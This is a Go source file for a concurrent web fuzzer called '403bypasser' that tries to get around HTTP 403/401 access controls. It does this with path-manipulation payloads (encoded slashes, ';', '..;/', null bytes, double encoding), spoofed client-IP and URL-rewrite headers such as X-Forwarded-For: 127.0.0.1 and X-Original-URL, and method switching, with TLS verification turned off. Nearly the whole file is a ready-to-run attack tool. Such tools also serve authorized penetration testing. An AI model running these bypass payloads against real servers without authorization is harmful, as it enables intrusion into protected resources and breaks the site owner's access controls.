package main

import (
	"bufio"
	"crypto/tls"
	_ "embed"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"
)

//go:embed wordlists/common.txt
var defaultWordlist string

const DefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// Color vars (not constants) so they can be blanked out by --no-color / non-TTY
var (
	ColorGreen  = "\033[92m"
	ColorRed    = "\033[91m"
	ColorYellow = "\033[93m"
	ColorCyan   = "\033[96m"
	ColorReset  = "\033[0m"
)

var (
	targetURL     string
	wordlistPath  string
	cookieString  string
	proxyURL      string
	outputFile    string
	threads       int
	timeout       int
	delay         int
	deepMode      bool
	verboseMode   bool
	noColor       bool
	showCodes     []int
	filterSizes   []int
	customHeaders []string

	fileMutex   sync.Mutex
	printLock   sync.Mutex
	resultsFile *os.File

	calibrationSize404  int
	calibrationSizeRoot int
	calibrationOK404    bool
	calibrationOKRoot   bool
)

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

var rootCmd = &cobra.Command{
	Use:   "403bypasser",
	Short: "Advanced 403/401 Bypasser & Access Control Fuzzer",
	Run: func(cmd *cobra.Command, args []string) {
		if noColor || !isTerminal() {
			disableColors()
		}

		fmt.Println(ColorCyan + `
██╗  ██╗ ██████╗ ██████╗   ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗███████╗██████╗
██║  ██║██╔═████╗╚════██╗  ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
███████║██║██╔██║ █████╔╝  ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗█████╗  ██████╔╝
╚════██║████╔╝██║ ╚═══██╗  ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║██╔══╝  ██╔══██╗
     ██║╚██████╔╝██████╔╝  ██████╔╝   ██║   ██║     ██║  ██║███████║███████║███████╗██║  ██║
     ╚═╝ ╚═════╝ ╚═════╝   ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
` + ColorReset)
		fmt.Println("    " + ColorGreen + "v1.2 | Advanced 403/401 Bypasser & Access Control Fuzzer" + ColorReset + "\n")

		if targetURL == "" {
			cmd.Help()
			return
		}
		startScan()
	},
}

func init() {
	rootCmd.Flags().StringVarP(&targetURL, "url", "u", "", "Target URL (Required)")
	rootCmd.Flags().StringVarP(&wordlistPath, "wordlist", "w", "", "Path to wordlist file (Optional)")
	rootCmd.Flags().StringVarP(&cookieString, "cookie", "c", "", "Raw session cookie (e.g., 'JSESSIONID=xxx')")
	rootCmd.Flags().StringVarP(&proxyURL, "proxy", "p", "", "Proxy URL (e.g. http://127.0.0.1:8080)")
	rootCmd.Flags().StringVarP(&outputFile, "output", "o", "results.txt", "Output file for results")
	rootCmd.Flags().IntVarP(&threads, "threads", "t", 10, "Number of concurrent threads")
	rootCmd.Flags().IntVarP(&timeout, "timeout", "T", 10, "HTTP request timeout in seconds")
	rootCmd.Flags().IntVarP(&delay, "delay", "d", 0, "Delay between requests in milliseconds (ms)")
	rootCmd.Flags().BoolVarP(&deepMode, "deep", "D", false, "Enable Deep Scan Mode (Nested Fuzzing)")
	rootCmd.Flags().BoolVarP(&verboseMode, "verbose", "v", false, "Show errors and failed requests")
	rootCmd.Flags().BoolVarP(&noColor, "no-color", "n", false, "Disable colored output")
	rootCmd.Flags().IntSliceVarP(&showCodes, "show-codes", "s", []int{200}, "HTTP status codes to report (e.g. -s 200,301,302)")
	rootCmd.Flags().IntSliceVarP(&filterSizes, "filter-size", "f", []int{}, "Filter out responses of specific sizes (e.g. -f 1234,5678)")
	rootCmd.Flags().StringSliceVarP(&customHeaders, "header", "H", []string{}, "Custom Header (e.g. -H 'Auth: Bearer 123')")
}

func isTerminal() bool {
	fi, err := os.Stdout.Stat()
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeCharDevice != 0
}

func disableColors() {
	ColorGreen = ""
	ColorRed = ""
	ColorYellow = ""
	ColorCyan = ""
	ColorReset = ""
}

func startScan() {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		fmt.Printf("%s[!] ERROR: Missing URL protocol! Please add 'http://' or 'https://'.\n", ColorRed)
		fmt.Printf("[!] Example: -u https://target.com%s\n", ColorReset)
		os.Exit(1)
	}

	customHeadersMap := make(map[string]string)
	for _, h := range customHeaders {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			customHeadersMap[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	baseURL := strings.TrimRight(targetURL, "/")

	// Open output file once and keep it open for the entire scan
	f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("%s[!] Cannot open output file: %v%s\n", ColorRed, err, ColorReset)
		os.Exit(1)
	}
	defer f.Close()
	resultsFile = f

	var wordlistReader io.Reader
	if wordlistPath != "" {
		wf, err := os.Open(wordlistPath)
		if err != nil {
			fmt.Printf("%s[!] Wordlist Error: %v%s\n", ColorRed, err, ColorReset)
			os.Exit(1)
		}
		defer wf.Close()
		wordlistReader = wf
		fmt.Printf("%s[*] Wordlist: %s%s\n", ColorCyan, wordlistPath, ColorReset)
	} else {
		wordlistReader = strings.NewReader(defaultWordlist)
		fmt.Printf("%s[*] No wordlist provided. Using embedded default wordlist.%s\n", ColorCyan, ColorReset)
	}

	seen := make(map[string]bool)
	var directories []string
	scanner := bufio.NewScanner(wordlistReader)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") && !seen[line] {
			seen[line] = true
			directories = append(directories, line)
		}
	}

	var transport *http.Transport
	if proxyURL != "" {
		parsedProxyURL, err := url.Parse(proxyURL)
		if err != nil {
			fmt.Printf("%s[!] Invalid Proxy URL: %v%s\n", ColorRed, err, ColorReset)
			os.Exit(1)
		}
		transport = &http.Transport{
			Proxy:           http.ProxyURL(parsedProxyURL),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		fmt.Printf("%s[*] Proxy Enabled: %s%s\n", ColorYellow, proxyURL, ColorReset)
	} else {
		transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	scanHeader := fmt.Sprintf("\n--- 403Bypasser Scan | Target: %s | Time: %s ---",
		baseURL, time.Now().Format("2006-01-02 15:04:05"))
	saveResult(scanHeader)

	fmt.Printf("%s[*] Target: %s\n", ColorYellow, baseURL)

	calibrate(client, baseURL, customHeadersMap, cookieString)

	fmt.Printf("[*] Threads: %d\n", threads)
	fmt.Printf("[*] Timeout: %ds\n", timeout)
	if delay > 0 {
		fmt.Printf("[*] Delay: %d ms\n", delay)
	}

	mode := "Standard"
	if deepMode {
		mode = "Deep Scan"
	}

	samplePayloads := generatePathPayloads("sample")
	sampleHeaders := generateHeaders("/sample")
	payloadCount := int64(len(samplePayloads))
	headerCount := int64(len(sampleHeaders))
	dirCount := int64(len(directories))

	var estimatedRequests int64
	if deepMode {
		estimatedRequests = dirCount * payloadCount * headerCount * 2
	} else {
		estimatedRequests = dirCount * (payloadCount*6 + headerCount)
	}

	fmt.Printf("[*] Mode: %s\n", mode)
	fmt.Printf("[*] Output: %s\n", outputFile)
	fmt.Printf("[*] Show Codes: %s\n", formatCodes(showCodes))
	if len(filterSizes) > 0 {
		fmt.Printf("[*] Filter Sizes: %s bytes\n", formatSizes(filterSizes))
	}
	fmt.Printf("[*] Custom Headers: %d\n", len(customHeadersMap))
	fmt.Printf("[*] Paths to Scan: %d (after dedup)\n", len(directories))
	fmt.Printf("[*] Estimated Requests: ~%s\n", formatCount(estimatedRequests))

	if deepMode && estimatedRequests > 500_000 {
		fmt.Printf("%s[!] Deep mode warning: ~%s requests. Consider using --delay to avoid rate limiting.%s\n",
			ColorYellow, formatCount(estimatedRequests), ColorReset)
	}

	fmt.Println("------------------------------------------------------------" + ColorReset)

	jobs := make(chan string, threads*2)
	var wg sync.WaitGroup
	var processedCount atomic.Int64
	total := int64(len(directories))

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for dir := range jobs {
				processDirectory(client, baseURL, dir, cookieString, customHeadersMap)
				count := processedCount.Add(1)
				printLock.Lock()
				fmt.Printf("\r%s[*] Progress: %d/%d%s", ColorCyan, count, total, ColorReset)
				printLock.Unlock()
			}
		}()
	}

	for _, dir := range directories {
		jobs <- dir
	}
	close(jobs)

	wg.Wait()
	fmt.Printf("\n%s[*] Scan Complete. Results saved to '%s'.%s\n", ColorGreen, outputFile, ColorReset)
}

func saveResult(result string) {
	fileMutex.Lock()
	defer fileMutex.Unlock()
	if resultsFile != nil {
		resultsFile.WriteString(result + "\n")
	}
}

func calibrate(client *http.Client, baseURL string, customHeaders map[string]string, cookies string) {
	fmt.Println(ColorYellow + "[*] Starting Calibration..." + ColorReset)

	randomURL := fmt.Sprintf("%s/calibration_%d", baseURL, time.Now().UnixNano())

	req404, err := http.NewRequest("GET", randomURL, nil)
	if err == nil {
		req404.Header.Set("User-Agent", DefaultUserAgent)
		if cookies != "" {
			req404.Header.Set("Cookie", cookies)
		}
		for k, v := range customHeaders {
			req404.Header.Set(k, v)
		}
		resp404, err := client.Do(req404)
		if err == nil {
			bodyBytes, _ := io.ReadAll(resp404.Body)
			resp404.Body.Close()
			calibrationSize404 = len(bodyBytes)
			calibrationOK404 = true
			fmt.Printf("[i] 404 (Not Found) Calibration Size: ~%d bytes\n", calibrationSize404)
		} else {
			fmt.Printf("%s[!] 404 Calibration failed: %v%s\n", ColorRed, err, ColorReset)
		}
	}

	reqRoot, err := http.NewRequest("GET", baseURL+"/", nil)
	if err == nil {
		reqRoot.Header.Set("User-Agent", DefaultUserAgent)
		if cookies != "" {
			reqRoot.Header.Set("Cookie", cookies)
		}
		for k, v := range customHeaders {
			reqRoot.Header.Set(k, v)
		}
		respRoot, err := client.Do(reqRoot)
		if err == nil {
			bodyBytes, _ := io.ReadAll(respRoot.Body)
			respRoot.Body.Close()
			calibrationSizeRoot = len(bodyBytes)
			calibrationOKRoot = true
			fmt.Printf("[i] Root (Homepage) Calibration Size: ~%d bytes\n", calibrationSizeRoot)
		} else {
			fmt.Printf("%s[!] Root Calibration failed: %v%s\n", ColorRed, err, ColorReset)
		}
	}

	if calibrationOK404 || calibrationOKRoot {
		fmt.Printf("[i] Anti-False Positive Active: Hiding 200 responses within +/- 100 bytes of calibration data.%s\n", ColorReset)
	} else {
		fmt.Printf("%s[!] Calibration completely failed. False positive filtering disabled.%s\n", ColorRed, ColorReset)
	}
	fmt.Println("------------------------------------------------------------")
}

func generateHeaders(targetPath string) []map[string]string {
	var headersList []map[string]string

	ipHeaders := []string{
		"X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP",
		"X-Host", "X-Custom-IP-Authorization", "X-Real-IP", "X-Forwarded-Host",
		"X-Forwarded-Server", "Client-IP", "True-Client-IP", "Fastly-Client-Ip",
		"X-Wap-Profile",
	}
	ipValues := []string{"127.0.0.1", "localhost", "::1", "0.0.0.0", "192.168.1.1", "10.0.0.1"}

	for _, key := range ipHeaders {
		for _, ip := range ipValues {
			headersList = append(headersList, map[string]string{key: ip})
		}
	}

	for _, key := range []string{"X-Original-URL", "X-Rewrite-URL", "X-Forwarded-URL"} {
		headersList = append(headersList, map[string]string{key: targetPath})
	}

	headersList = append(headersList, map[string]string{"X-Forwarded-Scheme": "http"})
	headersList = append(headersList, map[string]string{"X-Forwarded-Scheme": "https"})

	headersList = append(headersList, map[string]string{"Request-Uri": "127.0.0.1"})
	headersList = append(headersList, map[string]string{"Request-Uri": "localhost"})
	headersList = append(headersList, map[string]string{"Request-Uri": targetPath})

	headersList = append(headersList, map[string]string{"Referer": targetPath})
	headersList = append(headersList, map[string]string{"Referer": "https://localhost"})
	headersList = append(headersList, map[string]string{"Referer": "http://127.0.0.1"})
	headersList = append(headersList, map[string]string{"Referer": "https://127.0.0.1"})
	headersList = append(headersList, map[string]string{"Referer": "http://localhost/" + targetPath})

	headersList = append(headersList, map[string]string{"Range": "bytes=0-"})
	headersList = append(headersList, map[string]string{"X-HTTP-Method-Override": "POST"})

	return headersList
}

func urlEncode(str string) string {
	return url.PathEscape(str)
}

func generatePathPayloads(originalPath string) []string {
	cleanPath := strings.Trim(originalPath, "/")
	encodedPath := urlEncode(cleanPath)
	doubleEncoded := urlEncode(encodedPath)

	payloads := []string{
		fmt.Sprintf("/%s", cleanPath),
		fmt.Sprintf("/%s/", cleanPath),
		fmt.Sprintf("/%s/.", cleanPath),
		fmt.Sprintf("//%s//", cleanPath),
		fmt.Sprintf("/./%s/./", cleanPath),
		fmt.Sprintf("///%s", cleanPath),
		fmt.Sprintf("/%s//", cleanPath),

		fmt.Sprintf("/%s%%20", cleanPath),
		fmt.Sprintf("/%s%%09", cleanPath),
		fmt.Sprintf("/%%09/%s", cleanPath),
		fmt.Sprintf("/%s%%00", cleanPath),
		fmt.Sprintf("/%s%%0d", cleanPath),
		fmt.Sprintf("/%s%%0a", cleanPath),
		fmt.Sprintf("/%s%%23", cleanPath),
		fmt.Sprintf("/%s%%3f", cleanPath),

		fmt.Sprintf("/%s;", cleanPath),
		fmt.Sprintf("/%s;/", cleanPath),
		fmt.Sprintf("/%s;.", cleanPath),
		fmt.Sprintf("/;%s", cleanPath),
		fmt.Sprintf("/;/%s", cleanPath),
		fmt.Sprintf("/%s;/;", cleanPath),
		fmt.Sprintf("/%s;x", cleanPath),
		fmt.Sprintf("/%s;x/", cleanPath),
		fmt.Sprintf("/%s;?", cleanPath),
		fmt.Sprintf("/%s;;", cleanPath),

		fmt.Sprintf("/%s/..;/", cleanPath),
		fmt.Sprintf("/%s/..;/;", cleanPath),
		fmt.Sprintf("/%s/../", cleanPath),
		fmt.Sprintf("/%s/..%%00/", cleanPath),
		fmt.Sprintf("/%s/..%%0d/", cleanPath),
		fmt.Sprintf("/%s/..%%3b/", cleanPath),

		fmt.Sprintf("/%%2e/%s", cleanPath),
		fmt.Sprintf("/%s/%%2e", cleanPath),
		fmt.Sprintf("/%%2f%s", cleanPath),
		fmt.Sprintf("/%s%%2f", cleanPath),

		fmt.Sprintf("/%s", encodedPath),
		fmt.Sprintf("/%s", doubleEncoded),
		fmt.Sprintf("/%%252e/%s", cleanPath),
		fmt.Sprintf("/%%252f%s", cleanPath),

		fmt.Sprintf("/%s.json", cleanPath),
		fmt.Sprintf("/%s.html", cleanPath),
		fmt.Sprintf("/%s.php", cleanPath),
		fmt.Sprintf("/%s;.css", cleanPath),
		fmt.Sprintf("/%s;.js", cleanPath),

		// NOTE: /%s# is intentionally omitted — HTTP fragments are stripped
		// by the client before sending and never reach the server.
		fmt.Sprintf("/%s?", cleanPath),
	}

	return deduplicatePayloads(payloads)
}

func deduplicatePayloads(payloads []string) []string {
	seen := make(map[string]bool, len(payloads))
	result := make([]string, 0, len(payloads))
	for _, p := range payloads {
		if !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	return result
}

func absInt(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

func isFilteredSize(size int) bool {
	for _, fs := range filterSizes {
		if size == fs {
			return true
		}
	}
	return false
}

func isTargetStatus(status int) bool {
	for _, code := range showCodes {
		if code == status {
			return true
		}
	}
	return false
}

func colorForStatus(status int) string {
	switch {
	case status == 200:
		return ColorGreen
	case status >= 300 && status < 400:
		return ColorYellow
	case status >= 500:
		return ColorRed
	default:
		return ColorCyan
	}
}

func formatCount(n int64) string {
	if n >= 1_000_000 {
		return fmt.Sprintf("%.1fM", float64(n)/1_000_000)
	}
	if n >= 1_000 {
		return fmt.Sprintf("%.1fK", float64(n)/1_000)
	}
	return fmt.Sprintf("%d", n)
}

func formatCodes(codes []int) string {
	parts := make([]string, len(codes))
	for i, c := range codes {
		parts[i] = fmt.Sprintf("%d", c)
	}
	return strings.Join(parts, ", ")
}

func formatSizes(sizes []int) string {
	parts := make([]string, len(sizes))
	for i, s := range sizes {
		parts[i] = fmt.Sprintf("%d", s)
	}
	return strings.Join(parts, ", ")
}

func sendRequest(client *http.Client, targetURL string, cookies string, headers map[string]string, customHeaders map[string]string, method, label string) {
	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		if verboseMode {
			printLock.Lock()
			fmt.Printf("\n%s[!] Request build error: %v | URL: %s%s\n", ColorRed, err, targetURL, ColorReset)
			printLock.Unlock()
		}
		return
	}

	// Default UA first so -H "User-Agent: X" can override it
	req.Header.Set("User-Agent", DefaultUserAgent)

	// PUT without Content-Type gets rejected by many servers
	if method == "PUT" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	for k, v := range customHeaders {
		if strings.EqualFold(k, "Host") {
			req.Host = v
		} else {
			req.Header.Set(k, v)
		}
	}

	if cookies != "" {
		req.Header.Set("Cookie", cookies)
	}

	resp, err := client.Do(req)
	if err != nil {
		if verboseMode {
			printLock.Lock()
			fmt.Printf("\n%s[!] Request failed: %v | URL: %s%s\n", ColorRed, err, targetURL, ColorReset)
			printLock.Unlock()
		}
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	size := len(bodyBytes)
	status := resp.StatusCode

	// HEAD and OPTIONS have no body by design; allow them through
	sizeOK := size > 0 || method == "HEAD" || method == "OPTIONS"

	// False positive filtering: only for 200 with a body (not HEAD/OPTIONS)
	isFalsePositive := false
	if status == 200 && method != "HEAD" && method != "OPTIONS" {
		if calibrationOK404 && absInt(size-calibrationSize404) < 100 {
			isFalsePositive = true
		}
		if calibrationOKRoot && !isFalsePositive && absInt(size-calibrationSizeRoot) < 100 {
			isFalsePositive = true
		}
	}

	if isTargetStatus(status) && sizeOK && !isFalsePositive && !isFilteredSize(size) {
		logMessage := fmt.Sprintf("[+] FOUND (%d) | %s | %s | URL: %s | Size: %d",
			status, method, label, targetURL, size)

		color := colorForStatus(status)
		printLock.Lock()
		fmt.Printf("\n%s%s%s\n", color, logMessage, ColorReset)
		printLock.Unlock()

		saveResult(logMessage)
	}
}

func processDirectory(client *http.Client, baseURL, directory, cookies string, customHeaders map[string]string) {
	directory = strings.TrimSpace(directory)
	if directory == "" {
		return
	}

	pathPayloads := generatePathPayloads(directory)
	cleanDir := strings.TrimLeft(directory, "/")
	headersList := generateHeaders("/" + cleanDir)

	applyDelay := func() {
		if delay > 0 {
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}

	standardMethods := []string{"GET", "POST", "TRACE", "HEAD", "OPTIONS", "PUT"}

	if deepMode {
		for _, path := range pathPayloads {
			target := baseURL + path
			for _, header := range headersList {
				applyDelay()
				var headerKey string
				for k := range header {
					headerKey = k
					break
				}
				sendRequest(client, target, cookies, header, customHeaders, "GET", "Hdr:"+headerKey)
				sendRequest(client, target, cookies, header, customHeaders, "POST", "Hdr:"+headerKey)
			}
		}
	} else {
		for i, path := range pathPayloads {
			target := baseURL + path

			for _, method := range standardMethods {
				applyDelay()
				sendRequest(client, target, cookies, nil, customHeaders, method, "Method:"+method)
			}

			// Header fuzzing only on the canonical path to avoid redundant combinations
			if i == 0 {
				for _, header := range headersList {
					applyDelay()
					var headerKey string
					for k := range header {
						headerKey = k
						break
					}
					sendRequest(client, target, cookies, header, customHeaders, "GET", "Hdr:"+headerKey)
				}
			}
		}
	}
}
